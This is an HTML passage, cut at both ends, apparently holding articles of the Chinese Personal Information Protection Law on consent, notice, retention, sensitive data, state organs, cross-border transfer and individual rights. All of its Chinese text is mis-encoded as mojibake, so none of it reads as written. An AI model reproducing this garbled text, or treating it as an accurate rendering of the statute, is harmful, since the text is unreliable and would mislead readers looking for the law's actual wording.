2em;">ä¸ªäººæ’¤å›åŒæ„ï¼Œä¸å½±å“æ’¤å›å‰åŸºäºä¸ªäººåŒæ„å·²è¿›è¡Œçš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨çš„æ•ˆåŠ›ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå…­æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…ä¸å¾—ä»¥ä¸ªäººä¸åŒæ„å¤„ç†å…¶ä¸ªäººä¿¡æ¯æˆ–è€…æ’¤å›åŒæ„ä¸ºç”±ï¼Œæ‹’ç»æä¾›äº§å“æˆ–è€…æœåŠ¡ï¼›å¤„ç†ä¸ªäººä¿¡æ¯å±äºæä¾›äº§å“æˆ–è€…æœåŠ¡æ‰€å¿…éœ€çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸ƒæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åœ¨å¤„ç†ä¸ªäººä¿¡æ¯å‰ï¼Œåº”å½“ä»¥æ˜¾è‘—æ–¹å¼ã€æ¸…æ™°æ˜“æ‡‚çš„è¯­è¨€çœŸå®ã€å‡†ç¡®ã€å®Œæ•´åœ°å‘ä¸ªäººå‘ŠçŸ¥ä¸‹åˆ—äº‹é¡¹ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…çš„åç§°æˆ–è€…å§“åå’Œè”ç³»æ–¹å¼ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰ä¸ªäººä¿¡æ¯çš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼ï¼Œå¤„ç†çš„ä¸ªäººä¿¡æ¯ç§ç±»ã€ä¿å­˜æœŸé™ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰ä¸ªäººè¡Œä½¿æœ¬æ³•è§„å®šæƒåˆ©çš„æ–¹å¼å’Œç¨‹åºï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šåº”å½“å‘ŠçŸ¥çš„å…¶ä»–äº‹é¡¹ã€‚</p><p style="text-indent: 2em;">å‰æ¬¾è§„å®šäº‹é¡¹å‘ç”Ÿå˜æ›´çš„ï¼Œåº”å½“å°†å˜æ›´éƒ¨åˆ†å‘ŠçŸ¥ä¸ªäººã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…é€šè¿‡åˆ¶å®šä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™çš„æ–¹å¼å‘ŠçŸ¥ç¬¬ä¸€æ¬¾è§„å®šäº‹é¡¹çš„ï¼Œå¤„ç†è§„åˆ™åº”å½“å…¬å¼€ï¼Œå¹¶ä¸”ä¾¿äºæŸ¥é˜…å’Œä¿å­˜ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå…«æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å¤„ç†ä¸ªäººä¿¡æ¯ï¼Œæœ‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šåº”å½“ä¿å¯†æˆ–è€…ä¸éœ€è¦å‘ŠçŸ¥çš„æƒ…å½¢çš„ï¼Œå¯ä»¥ä¸å‘ä¸ªäººå‘ŠçŸ¥å‰æ¡ç¬¬ä¸€æ¬¾è§„å®šçš„äº‹é¡¹ã€‚</p><p style="text-indent: 2em;">ç´§æ€¥æƒ…å†µä¸‹ä¸ºä¿æŠ¤è‡ªç„¶äººçš„ç”Ÿå‘½å¥åº·å’Œè´¢äº§å®‰å…¨æ— æ³•åŠæ—¶å‘ä¸ªäººå‘ŠçŸ¥çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“åœ¨ç´§æ€¥æƒ…å†µæ¶ˆé™¤ååŠæ—¶å‘ŠçŸ¥ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¹æ¡</span>ã€€é™¤æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¦æœ‰è§„å®šå¤–ï¼Œä¸ªäººä¿¡æ¯çš„ä¿å­˜æœŸé™åº”å½“ä¸ºå®ç°å¤„ç†ç›®çš„æ‰€å¿…è¦çš„æœ€çŸ­æ—¶é—´ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåæ¡</span>ã€€ä¸¤ä¸ªä»¥ä¸Šçš„ä¸ªäººä¿¡æ¯å¤„ç†è€…å…±åŒå†³å®šä¸ªäººä¿¡æ¯çš„å¤„ç†ç›®çš„å’Œå¤„ç†æ–¹å¼çš„ï¼Œåº”å½“çº¦å®šå„è‡ªçš„æƒåˆ©å’Œä¹‰åŠ¡ã€‚ä½†æ˜¯ï¼Œè¯¥çº¦å®šä¸å½±å“ä¸ªäººå‘å…¶ä¸­ä»»ä½•ä¸€ä¸ªä¸ªäººä¿¡æ¯å¤„ç†è€…è¦æ±‚è¡Œä½¿æœ¬æ³•è§„å®šçš„æƒåˆ©ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…å…±åŒå¤„ç†ä¸ªäººä¿¡æ¯ï¼Œä¾µå®³ä¸ªäººä¿¡æ¯æƒç›Šé€ æˆæŸå®³çš„ï¼Œåº”å½“ä¾æ³•æ‰¿æ‹…è¿å¸¦è´£ä»»ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸€æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å§”æ‰˜å¤„ç†ä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“ä¸å—æ‰˜äººçº¦å®šå§”æ‰˜å¤„ç†çš„ç›®çš„ã€æœŸé™ã€å¤„ç†æ–¹å¼ã€ä¸ªäººä¿¡æ¯çš„ç§ç±»ã€ä¿æŠ¤æªæ–½ä»¥åŠåŒæ–¹çš„æƒåˆ©å’Œä¹‰åŠ¡ç­‰ï¼Œå¹¶å¯¹å—æ‰˜äººçš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨è¿›è¡Œç›‘ç£ã€‚</p><p style="text-indent: 2em;">å—æ‰˜äººåº”å½“æŒ‰ç…§çº¦å®šå¤„ç†ä¸ªäººä¿¡æ¯ï¼Œä¸å¾—è¶…å‡ºçº¦å®šçš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼ç­‰å¤„ç†ä¸ªäººä¿¡æ¯ï¼›å§”æ‰˜åˆåŒä¸ç”Ÿæ•ˆã€æ— æ•ˆã€è¢«æ’¤é”€æˆ–è€…ç»ˆæ­¢çš„ï¼Œå—æ‰˜äººåº”å½“å°†ä¸ªäººä¿¡æ¯è¿”è¿˜ä¸ªäººä¿¡æ¯å¤„ç†è€…æˆ–è€…äºˆä»¥åˆ é™¤ï¼Œä¸å¾—ä¿ç•™ã€‚</p><p style="text-indent: 2em;">æœªç»ä¸ªäººä¿¡æ¯å¤„ç†è€…åŒæ„ï¼Œå—æ‰˜äººä¸å¾—è½¬å§”æ‰˜ä»–äººå¤„ç†ä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåäºŒæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å› åˆå¹¶ã€åˆ†ç«‹ã€è§£æ•£ã€è¢«å®£å‘Šç ´äº§ç­‰åŸå› éœ€è¦è½¬ç§»ä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“å‘ä¸ªäººå‘ŠçŸ¥æ¥æ”¶æ–¹çš„åç§°æˆ–è€…å§“åå’Œè”ç³»æ–¹å¼ã€‚æ¥æ”¶æ–¹åº”å½“ç»§ç»­å±¥è¡Œä¸ªäººä¿¡æ¯å¤„ç†è€…çš„ä¹‰åŠ¡ã€‚æ¥æ”¶æ–¹å˜æ›´åŸå…ˆçš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼çš„ï¼Œåº”å½“ä¾ç…§æœ¬æ³•è§„å®šé‡æ–°å–å¾—ä¸ªäººåŒæ„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸‰æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å‘å…¶ä»–ä¸ªäººä¿¡æ¯å¤„ç†è€…æä¾›å…¶å¤„ç†çš„ä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“å‘ä¸ªäººå‘ŠçŸ¥æ¥æ”¶æ–¹çš„åç§°æˆ–è€…å§“åã€è”ç³»æ–¹å¼ã€å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼å’Œä¸ªäººä¿¡æ¯çš„ç§ç±»ï¼Œå¹¶å–å¾—ä¸ªäººçš„å•ç‹¬åŒæ„ã€‚æ¥æ”¶æ–¹åº”å½“åœ¨ä¸Šè¿°å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼å’Œä¸ªäººä¿¡æ¯çš„ç§ç±»ç­‰èŒƒå›´å†…å¤„ç†ä¸ªäººä¿¡æ¯ã€‚æ¥æ”¶æ–¹å˜æ›´åŸå…ˆçš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼çš„ï¼Œåº”å½“ä¾ç…§æœ¬æ³•è§„å®šé‡æ–°å–å¾—ä¸ªäººåŒæ„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå››æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åˆ©ç”¨ä¸ªäººä¿¡æ¯è¿›è¡Œè‡ªåŠ¨åŒ–å†³ç­–ï¼Œåº”å½“ä¿è¯å†³ç­–çš„é€æ˜åº¦å’Œç»“æœå…¬å¹³ã€å…¬æ­£ï¼Œä¸å¾—å¯¹ä¸ªäººåœ¨äº¤æ˜“ä»·æ ¼ç­‰äº¤æ˜“æ¡ä»¶ä¸Šå®è¡Œä¸åˆç†çš„å·®åˆ«å¾…é‡ã€‚</p><p style="text-indent: 2em;">é€šè¿‡è‡ªåŠ¨åŒ–å†³ç­–æ–¹å¼å‘ä¸ªäººè¿›è¡Œä¿¡æ¯æ¨é€ã€å•†ä¸šè¥é”€ï¼Œåº”å½“åŒæ—¶æä¾›ä¸é’ˆå¯¹å…¶ä¸ªäººç‰¹å¾çš„é€‰é¡¹ï¼Œæˆ–è€…å‘ä¸ªäººæä¾›ä¾¿æ·çš„æ‹’ç»æ–¹å¼ã€‚</p><p style="text-indent: 2em;">é€šè¿‡è‡ªåŠ¨åŒ–å†³ç­–æ–¹å¼ä½œå‡ºå¯¹ä¸ªäººæƒç›Šæœ‰é‡å¤§å½±å“çš„å†³å®šï¼Œä¸ªäººæœ‰æƒè¦æ±‚ä¸ªäººä¿¡æ¯å¤„ç†è€…äºˆä»¥è¯´æ˜ï¼Œå¹¶æœ‰æƒæ‹’ç»ä¸ªäººä¿¡æ¯å¤„ç†è€…ä»…é€šè¿‡è‡ªåŠ¨åŒ–å†³ç­–çš„æ–¹å¼ä½œå‡ºå†³å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåäº”æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…ä¸å¾—å…¬å¼€å…¶å¤„ç†çš„ä¸ªäººä¿¡æ¯ï¼Œå–å¾—ä¸ªäººå•ç‹¬åŒæ„çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå…­æ¡</span>ã€€åœ¨å…¬å…±åœºæ‰€å®‰è£…å›¾åƒé‡‡é›†ã€ä¸ªäººèº«ä»½è¯†åˆ«è®¾å¤‡ï¼Œåº”å½“ä¸ºç»´æŠ¤å…¬å…±å®‰å…¨æ‰€å¿…éœ€ï¼Œéµå®ˆå›½å®¶æœ‰å…³è§„å®šï¼Œå¹¶è®¾ç½®æ˜¾è‘—çš„æç¤ºæ ‡è¯†ã€‚æ‰€æ”¶é›†çš„ä¸ªäººå›¾åƒã€èº«ä»½è¯†åˆ«ä¿¡æ¯åªèƒ½ç”¨äºç»´æŠ¤å…¬å…±å®‰å…¨çš„ç›®çš„ï¼Œä¸å¾—ç”¨äºå…¶ä»–ç›®çš„ï¼›å–å¾—ä¸ªäººå•ç‹¬åŒæ„çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸ƒæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å¯ä»¥åœ¨åˆç†çš„èŒƒå›´å†…å¤„ç†ä¸ªäººè‡ªè¡Œå…¬å¼€æˆ–è€…å…¶ä»–å·²ç»åˆæ³•å…¬å¼€çš„ä¸ªäººä¿¡æ¯ï¼›ä¸ªäººæ˜ç¡®æ‹’ç»çš„é™¤å¤–ã€‚ä¸ªäººä¿¡æ¯å¤„ç†è€…å¤„ç†å·²å…¬å¼€çš„ä¸ªäººä¿¡æ¯ï¼Œå¯¹ä¸ªäººæƒç›Šæœ‰é‡å¤§å½±å“çš„ï¼Œåº”å½“ä¾ç…§æœ¬æ³•è§„å®šå–å¾—ä¸ªäººåŒæ„ã€‚</p><p style="text-align: center;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬äºŒèŠ‚â€‚â€‚æ•æ„Ÿä¸ªäººä¿¡æ¯çš„å¤„ç†è§„åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå…«æ¡</span>ã€€æ•æ„Ÿä¸ªäººä¿¡æ¯æ˜¯ä¸€æ—¦æ³„éœ²æˆ–è€…éæ³•ä½¿ç”¨ï¼Œå®¹æ˜“å¯¼è‡´è‡ªç„¶äººçš„äººæ ¼å°Šä¸¥å—åˆ°ä¾µå®³æˆ–è€…äººèº«ã€è´¢äº§å®‰å…¨å—åˆ°å±å®³çš„ä¸ªäººä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”Ÿç‰©è¯†åˆ«ã€å®—æ•™ä¿¡ä»°ã€ç‰¹å®šèº«ä»½ã€åŒ»ç–—å¥åº·ã€é‡‘èè´¦æˆ·ã€è¡Œè¸ªè½¨è¿¹ç­‰ä¿¡æ¯ï¼Œä»¥åŠä¸æ»¡åå››å‘¨å²æœªæˆå¹´äººçš„ä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;">åªæœ‰åœ¨å…·æœ‰ç‰¹å®šçš„ç›®çš„å’Œå……åˆ†çš„å¿…è¦æ€§ï¼Œå¹¶é‡‡å–ä¸¥æ ¼ä¿æŠ¤æªæ–½çš„æƒ…å½¢ä¸‹ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…æ–¹å¯å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¹æ¡</span>ã€€å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯åº”å½“å–å¾—ä¸ªäººçš„å•ç‹¬åŒæ„ï¼›æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šå¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯åº”å½“å–å¾—ä¹¦é¢åŒæ„çš„ï¼Œä»å…¶è§„å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯çš„ï¼Œé™¤æœ¬æ³•ç¬¬åä¸ƒæ¡ç¬¬ä¸€æ¬¾è§„å®šçš„äº‹é¡¹å¤–ï¼Œè¿˜åº”å½“å‘ä¸ªäººå‘ŠçŸ¥å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯çš„å¿…è¦æ€§ä»¥åŠå¯¹ä¸ªäººæƒç›Šçš„å½±å“ï¼›ä¾ç…§æœ¬æ³•è§„å®šå¯ä»¥ä¸å‘ä¸ªäººå‘ŠçŸ¥çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸€æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å¤„ç†ä¸æ»¡åå››å‘¨å²æœªæˆå¹´äººä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“å–å¾—æœªæˆå¹´äººçš„çˆ¶æ¯æˆ–è€…å…¶ä»–ç›‘æŠ¤äººçš„åŒæ„ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…å¤„ç†ä¸æ»¡åå››å‘¨å²æœªæˆå¹´äººä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“åˆ¶å®šä¸“é—¨çš„ä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åäºŒæ¡</span>ã€€æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¯¹å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯è§„å®šåº”å½“å–å¾—ç›¸å…³è¡Œæ”¿è®¸å¯æˆ–è€…ä½œå‡ºå…¶ä»–é™åˆ¶çš„ï¼Œä»å…¶è§„å®šã€‚</p><p style="text-align: center;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸‰èŠ‚ã€€å›½å®¶æœºå…³å¤„ç†ä¸ªäººä¿¡æ¯çš„ç‰¹åˆ«è§„å®š</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸‰æ¡</span>ã€€å›½å®¶æœºå…³å¤„ç†ä¸ªäººä¿¡æ¯çš„æ´»åŠ¨ï¼Œé€‚ç”¨æœ¬æ³•ï¼›æœ¬èŠ‚æœ‰ç‰¹åˆ«è§„å®šçš„ï¼Œé€‚ç”¨æœ¬èŠ‚è§„å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå››æ¡</span>ã€€å›½å®¶æœºå…³ä¸ºå±¥è¡Œæ³•å®šèŒè´£å¤„ç†ä¸ªäººä¿¡æ¯ï¼Œåº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„æƒé™ã€ç¨‹åºè¿›è¡Œï¼Œä¸å¾—è¶…å‡ºå±¥è¡Œæ³•å®šèŒè´£æ‰€å¿…éœ€çš„èŒƒå›´å’Œé™åº¦ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åäº”æ¡</span>ã€€å›½å®¶æœºå…³ä¸ºå±¥è¡Œæ³•å®šèŒè´£å¤„ç†ä¸ªäººä¿¡æ¯ï¼Œåº”å½“ä¾ç…§æœ¬æ³•è§„å®šå±¥è¡Œå‘ŠçŸ¥ä¹‰åŠ¡ï¼›æœ‰æœ¬æ³•ç¬¬åå…«æ¡ç¬¬ä¸€æ¬¾è§„å®šçš„æƒ…å½¢ï¼Œæˆ–è€…å‘ŠçŸ¥å°†å¦¨ç¢å›½å®¶æœºå…³å±¥è¡Œæ³•å®šèŒè´£çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå…­æ¡</span>ã€€å›½å®¶æœºå…³å¤„ç†çš„ä¸ªäººä¿¡æ¯åº”å½“åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å­˜å‚¨ï¼›ç¡®éœ€å‘å¢ƒå¤–æä¾›çš„ï¼Œåº”å½“è¿›è¡Œå®‰å…¨è¯„ä¼°ã€‚å®‰å…¨è¯„ä¼°å¯ä»¥è¦æ±‚æœ‰å…³éƒ¨é—¨æä¾›æ”¯æŒä¸ååŠ©ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸ƒæ¡</span>ã€€æ³•å¾‹ã€æ³•è§„æˆæƒçš„å…·æœ‰ç®¡ç†å…¬å…±äº‹åŠ¡èŒèƒ½çš„ç»„ç»‡ä¸ºå±¥è¡Œæ³•å®šèŒè´£å¤„ç†ä¸ªäººä¿¡æ¯ï¼Œé€‚ç”¨æœ¬æ³•å…³äºå›½å®¶æœºå…³å¤„ç†ä¸ªäººä¿¡æ¯çš„è§„å®šã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰ç« ã€€ä¸ªäººä¿¡æ¯è·¨å¢ƒæä¾›çš„è§„åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå…«æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å› ä¸šåŠ¡ç­‰éœ€è¦ï¼Œç¡®éœ€å‘ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–æä¾›ä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“å…·å¤‡ä¸‹åˆ—æ¡ä»¶ä¹‹ä¸€ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰ä¾ç…§æœ¬æ³•ç¬¬å››åæ¡çš„è§„å®šé€šè¿‡å›½å®¶ç½‘ä¿¡éƒ¨é—¨ç»„ç»‡çš„å®‰å…¨è¯„ä¼°ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰æŒ‰ç…§å›½å®¶ç½‘ä¿¡éƒ¨é—¨çš„è§„å®šç»ä¸“ä¸šæœºæ„è¿›è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤è®¤è¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰æŒ‰ç…§å›½å®¶ç½‘ä¿¡éƒ¨é—¨åˆ¶å®šçš„æ ‡å‡†åˆåŒä¸å¢ƒå¤–æ¥æ”¶æ–¹è®¢ç«‹åˆåŒï¼Œçº¦å®šåŒæ–¹çš„æƒåˆ©å’Œä¹‰åŠ¡ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„æˆ–è€…å›½å®¶ç½‘ä¿¡éƒ¨é—¨è§„å®šçš„å…¶ä»–æ¡ä»¶ã€‚</p><p style="text-indent: 2em;">ä¸­åäººæ°‘å…±å’Œå›½ç¼”ç»“æˆ–è€…å‚åŠ çš„å›½é™…æ¡çº¦ã€åå®šå¯¹å‘ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–æä¾›ä¸ªäººä¿¡æ¯çš„æ¡ä»¶ç­‰æœ‰è§„å®šçš„ï¼Œå¯ä»¥æŒ‰ç…§å…¶è§„å®šæ‰§è¡Œã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“é‡‡å–å¿…è¦æªæ–½ï¼Œä¿éšœå¢ƒå¤–æ¥æ”¶æ–¹å¤„ç†ä¸ªäººä¿¡æ¯çš„æ´»åŠ¨è¾¾åˆ°æœ¬æ³•è§„å®šçš„ä¸ªäººä¿¡æ¯ä¿æŠ¤æ ‡å‡†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¹æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…å‘ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–æä¾›ä¸ªäººä¿¡æ¯çš„ï¼Œåº”å½“å‘ä¸ªäººå‘ŠçŸ¥å¢ƒå¤–æ¥æ”¶æ–¹çš„åç§°æˆ–è€…å§“åã€è”ç³»æ–¹å¼ã€å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼ã€ä¸ªäººä¿¡æ¯çš„ç§ç±»ä»¥åŠä¸ªäººå‘å¢ƒå¤–æ¥æ”¶æ–¹è¡Œä½¿æœ¬æ³•è§„å®šæƒåˆ©çš„æ–¹å¼å’Œç¨‹åºç­‰äº‹é¡¹ï¼Œå¹¶å–å¾—ä¸ªäººçš„å•ç‹¬åŒæ„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åæ¡</span>ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½è¿è¥è€…å’Œå¤„ç†ä¸ªäººä¿¡æ¯è¾¾åˆ°å›½å®¶ç½‘ä¿¡éƒ¨é—¨è§„å®šæ•°é‡çš„ä¸ªäººä¿¡æ¯å¤„ç†è€…ï¼Œåº”å½“å°†åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…æ”¶é›†å’Œäº§ç”Ÿçš„ä¸ªäººä¿¡æ¯å­˜å‚¨åœ¨å¢ƒå†…ã€‚ç¡®éœ€å‘å¢ƒå¤–æä¾›çš„ï¼Œåº”å½“é€šè¿‡å›½å®¶ç½‘ä¿¡éƒ¨é—¨ç»„ç»‡çš„å®‰å…¨è¯„ä¼°ï¼›æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å’Œå›½å®¶ç½‘ä¿¡éƒ¨é—¨è§„å®šå¯ä»¥ä¸è¿›è¡Œå®‰å…¨è¯„ä¼°çš„ï¼Œä»å…¶è§„å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸€æ¡</span>ã€€ä¸­åäººæ°‘å…±å’Œå›½ä¸»ç®¡æœºå…³æ ¹æ®æœ‰å…³æ³•å¾‹å’Œä¸­åäººæ°‘å…±å’Œå›½ç¼”ç»“æˆ–è€…å‚åŠ çš„å›½é™…æ¡çº¦ã€åå®šï¼Œæˆ–è€…æŒ‰ç…§å¹³ç­‰äº’æƒ åŸåˆ™ï¼Œå¤„ç†å¤–å›½å¸æ³•æˆ–è€…æ‰§æ³•æœºæ„å…³äºæä¾›å­˜å‚¨äºå¢ƒå†…ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚éç»ä¸­åäººæ°‘å…±å’Œå›½ä¸»ç®¡æœºå…³æ‰¹å‡†ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…ä¸å¾—å‘å¤–å›½å¸æ³•æˆ–è€…æ‰§æ³•æœºæ„æä¾›å­˜å‚¨äºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…çš„ä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åäºŒæ¡</span>ã€€å¢ƒå¤–çš„ç»„ç»‡ã€ä¸ªäººä»äº‹ä¾µå®³ä¸­åäººæ°‘å…±å’Œå›½å…¬æ°‘çš„ä¸ªäººä¿¡æ¯æƒç›Šï¼Œæˆ–è€…å±å®³ä¸­åäººæ°‘å…±å’Œå›½å›½å®¶å®‰å…¨ã€å…¬å…±åˆ©ç›Šçš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨çš„ï¼Œå›½å®¶ç½‘ä¿¡éƒ¨é—¨å¯ä»¥å°†å…¶åˆ—å…¥é™åˆ¶æˆ–è€…ç¦æ­¢ä¸ªäººä¿¡æ¯æä¾›æ¸…å•ï¼Œäºˆä»¥å…¬å‘Šï¼Œå¹¶é‡‡å–é™åˆ¶æˆ–è€…ç¦æ­¢å‘å…¶æä¾›ä¸ªäººä¿¡æ¯ç­‰æªæ–½ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸‰æ¡</span>ã€€ä»»ä½•å›½å®¶æˆ–è€…åœ°åŒºåœ¨ä¸ªäººä¿¡æ¯ä¿æŠ¤æ–¹é¢å¯¹ä¸­åäººæ°‘å…±å’Œå›½é‡‡å–æ­§è§†æ€§çš„ç¦æ­¢ã€é™åˆ¶æˆ–è€…å…¶ä»–ç±»ä¼¼æªæ–½çš„ï¼Œä¸­åäººæ°‘å…±å’Œå›½å¯ä»¥æ ¹æ®å®é™…æƒ…å†µå¯¹è¯¥å›½å®¶æˆ–è€…åœ°åŒºå¯¹ç­‰é‡‡å–æªæ–½ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬å››ç« ã€€ä¸ªäººåœ¨ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ä¸­çš„æƒåˆ©</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åå››æ¡</span>ã€€ä¸ªäººå¯¹å…¶ä¸ªäººä¿¡æ¯çš„å¤„ç†äº«æœ‰çŸ¥æƒ…æƒã€å†³å®šæƒï¼Œæœ‰æƒé™åˆ¶æˆ–è€…æ‹’ç»ä»–äººå¯¹å…¶ä¸ªäººä¿¡æ¯è¿›è¡Œå¤„ç†ï¼›æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¦æœ‰è§„å®šçš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åäº”æ¡</span>ã€€ä¸ªäººæœ‰æƒå‘ä¸ªäººä¿¡æ¯å¤„ç†è€…æŸ¥é˜…ã€å¤åˆ¶å…¶ä¸ªäººä¿¡æ¯ï¼›æœ‰æœ¬æ³•ç¬¬åå…«æ¡ç¬¬ä¸€æ¬¾ã€ç¬¬ä¸‰åäº”æ¡è§„å®šæƒ…å½¢çš„é™¤å¤–ã€‚</p><p style="text-indent: 